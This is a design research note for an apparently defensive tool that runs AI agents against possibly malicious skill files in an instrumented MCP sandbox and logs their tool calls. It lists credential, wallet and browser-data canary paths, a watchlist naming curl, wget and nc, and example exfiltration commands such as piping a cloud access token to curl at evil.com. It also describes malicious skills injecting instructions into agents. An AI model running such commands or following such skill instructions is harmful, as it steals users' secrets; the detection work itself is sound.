# skillscan-trace: Prior Art & Design Research

*Researched 2026-03-20. Informs Milestone 18 implementation.*

---

## The Core Question

Does prior art exist for running an AI agent through an instrumented environment and observing its tool-call behavior? The answer is: **partially, across four distinct spaces that don't yet overlap.** No single tool does exactly what skillscan-trace needs, but the building blocks are mature and well-understood.

---

## What Exists: Four Research Areas

### 1. AI Agent Execution Sandboxes

The focus here is **isolating** agents from the host system, not observing them. The major players:

| Tool | Approach | Relevance |
|---|---|---|
| [E2B](https://e2b.dev/) | Firecracker microVM per agent session; <200ms cold start; full filesystem + shell | High — isolation layer we could wrap |
| [Inspect AI](https://inspect.aisi.org.uk/sandboxing.html) | UK AI Safety Institute eval framework; provisions Docker/K8s/Modal sandboxes for model evals | High — closest thing to what we want, but for evals not security tracing |
| [Kubernetes Agent Sandbox](https://github.com/kubernetes-sigs/agent-sandbox) | CRD/controller for declarative isolated agent workloads | Medium — overkill for local use |
| LangChain Deep Agents | Integrations with Modal, Daytona, Runloop for code execution | Low — cloud-dependent |

**Key finding:** These tools solve the *containment* problem well. None of them instrument the agent's tool calls for security analysis — they just prevent the agent from escaping the container. The observation layer is absent.

**E2B is the most relevant** because it's Firecracker-backed (same isolation primitive as Lambda/Fargate), has a clean Python SDK, and is open-source enough to run locally. But it's still primarily a code execution sandbox, not a behavioral trace tool.

### 2. MCP Server Mocking and Testing

The MCP ecosystem is young but already has tooling:

| Tool | What it does | Relevance |
|---|---|---|
| [MCP Inspector](https://modelcontextprotocol.io/docs/tools/inspector) | Interactive debugger for MCP servers; validates schemas and tool execution | High — useful for development, not runtime tracing |
| [MockMCP](https://mockmcp.com/) | AI-generated schema-compliant mock data for MCP servers; Daemon + Adapter architecture | Medium — mock data generation, not behavioral observation |
| [WireMock MCP](https://www.wiremock.io/mcp-server) | AI-powered API simulation integrated with coding tools | Low — developer tooling, not security-focused |
| [Microcks](https://apievangelist.com/2026/01/28/mcp-server-for-microcks-mokcing-and-testing/) | API mocking platform with proposed MCP server | Low — enterprise API testing |

**Key finding:** No existing MCP mock server is designed for *security observation* — logging every tool call, checking parameters against a canary taxonomy, and emitting findings. The MCP Inspector is the closest thing to what we need for development, but it's interactive (human-in-the-loop), not automated. **We need to build the instrumented MCP server ourselves**, but the protocol is well-documented and the Python SDK makes this tractable.

### 3. Process-Level Behavioral Tracing (Security Analyst Toolbox)

This is the most mature space — Linux security analysts have been doing this for decades:

| Tool | Approach | Overhead | Relevance |
|---|---|---|---|
| [strace](https://medium.com/@nuwanwe/strace-a-deep-dive-into-system-call-tracing-9ec9fc77c745) | ptrace-based syscall interception | High (~2-10x slowdown) | Medium — too coarse for tool-call semantics |
| [eBPF](https://falco.org/blog/tracing-syscalls-using-ebpf-part-1/) | In-kernel programs attached to kernel events | Very low (<5%) | High — the right primitive |
| [Falco](https://falco.org/) | eBPF-based runtime security; rule engine for anomalous behavior | Low | High — exactly the pattern we want at the syscall layer |
| [Sysdig](https://www.sysdig.com/blog/sysdig-and-falco-now-powered-by-ebpf) | System call tracer + container visibility | Low | Medium — more ops-focused than security research |
| [seccomp](https://www.benburwell.com/posts/learning-about-syscall-filtering-with-seccomp/) | Kernel-level syscall allowlist/denylist | Negligible | High — enforcement layer, not observation |

**Key finding:** **Falco is the right model for our detection layer.** It uses eBPF to observe syscalls with minimal overhead, has a rule engine that maps low-level events to high-level findings, and is designed for exactly the "observe anomalous behavior in a container" use case. The pattern is: define what normal looks like, flag deviations. We should adopt this architecture at the MCP layer (tool calls) rather than the syscall layer — but the design philosophy is identical.

**The gap:** None of these tools know what an MCP tool call *means*. They see `open("/home/user/.ssh/id_rsa", O_RDONLY)` — they don't know that was triggered by a `read_file` tool call from an agent following a malicious skill instruction. Bridging that semantic gap is the novel contribution of skillscan-trace.

### 4. Malware Analysis Sandboxes

The traditional dynamic analysis space:

| Tool | Approach | Self-hostable | Relevance |
|---|---|---|---|
| [CAPE Sandbox](https://capev2.readthedocs.io/) | Cuckoo v1 fork; active development; programmable debugger; unpacking | Yes | Medium — designed for binaries, not agent tool loops |
| [Drakvuf](https://drakvuf.com/) | Virtualization-based agentless binary analysis; stealthy execution tracing | Yes | Medium — powerful but binary-focused |
| [ANY.RUN](https://any.run/) | Interactive cloud sandbox; real-time behavioral analysis | No (commercial) | Low — cloud-only |
| Cuckoo Sandbox | Original open-source sandbox | Yes (unmaintained) | Low — deprecated |

**Key finding:** CAPE and Drakvuf are the gold standard for "run untrusted code and record what it does." Their architecture — isolated VM, instrumented execution, behavioral report — is exactly the pattern we want. But they're designed for **binaries** (PE files, scripts), not for **LLM agent tool-use loops**. The instrumentation hooks are at the binary execution layer, not the MCP protocol layer.

**The conceptual model is directly applicable.** CAPE's approach: provision an isolated environment → execute the sample → record all file, network, and process activity → generate a structured behavioral report. skillscan-trace does the same thing, but the "sample" is a SKILL.md file and the "execution" is an LLM agent following its instructions.

---

## Synthesis: What skillscan-trace Actually Needs

The research confirms there is **no existing tool that does exactly this**. The closest analogues are:

- **Inspect AI** for the "run an agent in a controlled environment" pattern
- **Falco** for the "observe behavior and flag deviations from policy" pattern  
- **CAPE Sandbox** for the "instrument execution and produce a behavioral report" pattern

skillscan-trace is the intersection of all three, applied to the MCP tool-use layer.

### Recommended Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    skillscan-trace                       │
│                                                          │
│  ┌──────────────┐    ┌─────────────────────────────┐    │
│  │  Agent       │    │  Instrumented MCP Server    │    │
│  │  Harness     │◄──►│  (fake tools + canary layer)│    │
│  │              │    │                             │    │
│  │  - Loads     │    │  read_file → canary check   │    │
│  │    SKILL.md  │    │  write_file → path check    │    │
│  │    as system │    │  bash → cmd audit           │    │
│  │    prompt    │    │  http_fetch → IOC check     │    │
│  │  - Sends     │    │                             │    │
│  │    user      │    │  All calls logged to trace  │    │
│  │    prompt    │    └──────────────┬──────────────┘    │
│  │  - Drives    │                   │                    │
│  │    tool loop │    ┌──────────────▼──────────────┐    │
│  └──────────────┘    │  Trace Analyzer + SARIF     │    │
│                      │  Emitter                    │    │
│  Model: Ollama       │                             │    │
│  (llama3.1:8b or     │  Maps observed behaviors    │    │
│   mistral:7b)        │  to finding schema          │    │
│                      └─────────────────────────────┘    │
└─────────────────────────────────────────────────────────┘
```

### Build Order

The research suggests this build order minimizes risk:

1. **Instrumented MCP server first** (SB1). This is the novel piece with no prior art. Build a Python MCP server using the official `mcp` SDK that implements `read_file`, `write_file`, `bash`, and `http_fetch` — but intercepts every call, checks it against the canary taxonomy, and appends to a trace log. This can be tested standalone without any agent.

2. **Ollama agent harness** (SB2/SB3). A thin Python script that loads a SKILL.md as a system prompt, connects to the local Ollama API, and drives the tool-use loop using the instrumented MCP server. Use `llama3.1:8b` or `mistral:7b` — small enough to run locally, compliant enough to follow skill instructions without refusing.

3. **Canary filesystem** (SB1 extension). A tmpfs mount with a full canary target set — see expanded taxonomy below. The MCP server's `read_file` and `bash` implementations check every path and command against the canary list before returning content.

4. **SARIF emitter** (SB3). Maps the trace log to findings using the existing SkillScan finding schema. Canary reads → EXF/MAL, undeclared network calls → IOC/EXF, permission violations → PSV.

5. **Docker packaging** (SB3). Wrap everything in a container with Ollama pre-pulled. The container is the unit of distribution.

### Why Ollama / Small Models First

A well-aligned model (Claude, GPT-4o) will often refuse to follow malicious instructions in a skill — producing false negatives at the behavioral layer. A smaller, less-aligned model (`llama3.1:8b`, `mistral:7b`, or `dolphin-mistral` for uncensored behavior) will follow the instructions, which is the ground-truth signal we want. This is also faster, cheaper, and fully offline — no API keys required.

The model needs to reliably emit well-formed tool-call JSON. `llama3.2:3b` is borderline; `llama3.1:8b` and `mistral:7b` are reliable for structured tool use. Both should be tested.

---

## Expanded Canary Taxonomy

*Updated 2026-03-20 to reflect broader target surface beyond SSH/AWS credentials.*

The original SB1 spec covered the obvious credential targets. The real attack surface is wider — malicious skills also target executables, crypto wallets, browser state, and perform filesystem reconnaissance before acting. The canary environment needs to cover all of these.

### File Targets (read_file / bash cat/cp/tar)

| Category | Canary Paths | Finding Class |
|---|---|---|
| SSH credentials | `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`, `~/.ssh/config`, `~/.ssh/authorized_keys` | EXF/MAL |
| Cloud credentials | `~/.aws/credentials`, `~/.aws/config`, `~/.config/gcloud/credentials.db`, `~/.config/gcloud/application_default_credentials.json`, `~/.kube/config` | EXF/MAL |
| API keys / env | `~/.env`, `.env`, `.env.local`, `.env.production` | EXF/MAL |
| Crypto wallets | `~/Library/Application Support/Bitcoin/wallet.dat`, `~/.bitcoin/wallet.dat`, `~/.ethereum/keystore/`, `~/.config/solana/id.json`, `~/snap/bitcoin-core/*/bitcoin/wallet.dat` | EXF/MAL |
| Browser state | `~/Library/Application Support/Google/Chrome/Default/Login Data`, `~/.config/google-chrome/Default/Login Data`, `~/Library/Application Support/Firefox/Profiles/*/logins.json` | EXF/MAL |
| System secrets | `/etc/passwd`, `/etc/shadow`, `/etc/hosts` | EXF/MAL |
| Git credentials | `~/.gitconfig`, `~/.git-credentials`, `.git/config` | EXF/MAL |
| Shell history | `~/.bash_history`, `~/.zsh_history`, `~/.zshrc`, `~/.bashrc` | EXF/MAL |

### Binary / Executable Probing (bash which/find/ls/stat)

A skill may probe for the presence of specific binaries before deciding whether to execute a payload — e.g., `which curl`, `which python3`, `find / -name gpg`, `ls /usr/bin/aws`. This is reconnaissance, not exfiltration, but it's a strong signal of malicious intent.

The `bash` tool intercept should detect and log:
- `which <binary>` or `command -v <binary>` calls for any binary in a watchlist (`curl`, `wget`, `nc`, `ncat`, `python3`, `ruby`, `perl`, `gpg`, `openssl`, `aws`, `gcloud`, `kubectl`, `docker`, `git`)
- `find` commands that traverse home directory or system paths
- `ls` or `stat` calls on canary paths
- Any attempt to execute a binary directly (e.g., `python3 -c "..."`, `bash -c "..."`, `curl | bash`)

These map to a new finding class: **RCN** (Reconnaissance) — lower severity than EXF but still a signal worth surfacing.

### Network Targets (http_fetch / bash curl/wget)

The network layer needs two modes:

**Blocklist mode (default):** All outbound calls are blocked and logged. Any destination not on the allowlist is a finding. IOC DB is checked against known C2 domains and exfil endpoints.

**Allowlist mode (for legitimate tools):** Some skills legitimately call into Google APIs, GitHub, npm registries, or other known-good services via CLI tools (`gcloud`, `gh`, `npm`). These should be configurable per-scan via a `--allow-domains` flag or a YAML config file:

```yaml
# trace-config.yml
allow_domains:
  - "*.googleapis.com"
  - "*.github.com"
  - "api.github.com"
  - "registry.npmjs.org"
  - "*.amazonaws.com"   # only if skill is an AWS tool
```

Calls to allowlisted domains are still **logged** (so the trace is complete) but do not generate findings. Calls to non-allowlisted domains generate an IOC/EXF finding with the destination URL.

This is important: a skill that calls `gcloud auth print-access-token` and pipes it to `curl https://evil.com` should generate a finding on `evil.com` even if `googleapis.com` is allowlisted. The allowlist applies to the *destination*, not to the presence of credential-fetching commands.

### Generic Filesystem Interception

Beyond named canary files, the `bash` tool intercept should implement a **path pattern watchlist** that catches filesystem exploration even when the agent doesn't know the exact path:

- Any `find` or `ls -R` traversal of `~/`, `/home/`, `/Users/`, `/root/`
- Any glob expansion that matches canary path patterns (`*.pem`, `*.key`, `wallet.dat`, `keystore`, `credentials`)
- Any `tar`, `zip`, or `cp` command that includes a home directory subtree
- Any `cat` or `head` on files matching `*.env`, `*.key`, `*.pem`, `id_*`, `*credentials*`, `*secret*`, `*token*`

These are logged as **RCN** (Reconnaissance) or **EXF** depending on whether the file was actually read or just probed.

### Implementation Note: Two Interception Layers

The canary taxonomy implies two distinct interception points in the MCP server:

1. **Structured tool calls** (`read_file`, `write_file`, `http_fetch`) — these are easy to intercept at the MCP protocol layer because the parameters are structured JSON. Path and URL are explicit.

2. **Shell commands** (`bash`) — these require command parsing. A regex-based command classifier is sufficient for v0.1 (pattern match against known dangerous command patterns). A full shell AST parser is more accurate but overkill for the initial version.

For v0.1, the bash interceptor should use a layered approach: first check the full command string against a pattern list, then check any path-like arguments against the canary path list. False negatives are acceptable at this layer — the goal is signal, not completeness.

---

## Open Questions for Implementation

1. **MCP SDK maturity.** The official Python `mcp` SDK (`pip install mcp`) is the right foundation for the instrumented server. Need to verify it supports custom server implementations cleanly.

2. **Ollama tool-use support.** Ollama added OpenAI-compatible tool-use in late 2024. Need to verify `llama3.1:8b` reliably emits tool calls in the Ollama format and that the harness can drive a multi-turn tool loop.

3. **Corpus feedback loop design.** How does a trace result become a labeled corpus example? The pipeline is: trace → behavioral findings → human review → labeled SKILL.md → `corpus/sandbox_verified/`. This is the path to improving injection recall without external datasets.

4. **Falco as a secondary layer.** Worth considering Falco as a *secondary* detection layer inside the container — it would catch behaviors that bypass the MCP layer (e.g., a skill that somehow gets the agent to execute a subprocess directly). The expanded canary taxonomy makes this more valuable: Falco can catch direct `open()` syscalls on canary paths even if the agent bypasses the MCP `read_file` tool entirely. Not required for v0.1 but a natural v0.2 addition.

5. **Command parsing depth.** The `bash` tool interceptor needs to handle common obfuscation: variable expansion (`CMD=$(echo 'Y3VybA==' | base64 -d); $CMD ...`), subshell execution, and heredoc payloads. For v0.1, a pattern-based approach catches the obvious cases. A proper shell AST parser (e.g., using `bashlex` in Python) would catch more but adds complexity.

6. **Allowlist config format.** The `--allow-domains` / `trace-config.yml` approach needs to be defined before SB3 (CLI harness). The config should also support `allow_paths` for skills that legitimately read files outside the default safe set (e.g., a git tool that reads `.git/config`).

---

## References

- [E2B — Secure sandboxes for AI agents](https://e2b.dev/)
- [Inspect AI Sandboxing — UK AI Safety Institute](https://inspect.aisi.org.uk/sandboxing.html)
- [Kubernetes Agent Sandbox](https://github.com/kubernetes-sigs/agent-sandbox)
- [MCP Inspector](https://modelcontextprotocol.io/docs/tools/inspector)
- [MockMCP](https://mockmcp.com/)
- [Falco — Cloud-native runtime security](https://falco.org/)
- [Falco: Tracing syscalls using eBPF](https://falco.org/blog/tracing-syscalls-using-ebpf-part-1/)
- [Sysdig + Falco powered by eBPF](https://www.sysdig.com/blog/sysdig-and-falco-now-powered-by-ebpf)
- [seccomp syscall filtering](https://www.benburwell.com/posts/learning-about-syscall-filtering-with-seccomp/)
- [CAPE Sandbox documentation](https://capev2.readthedocs.io/)
- [CAPE Sandbox GitHub](https://github.com/kevoreilly/CAPEv2)
- [Drakvuf — Virtualization-based binary analysis](https://drakvuf.com/)
- [NVIDIA: Practical Security Guidance for Sandboxing Agentic Workflows](https://developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows-and-managing-execution-risk/)
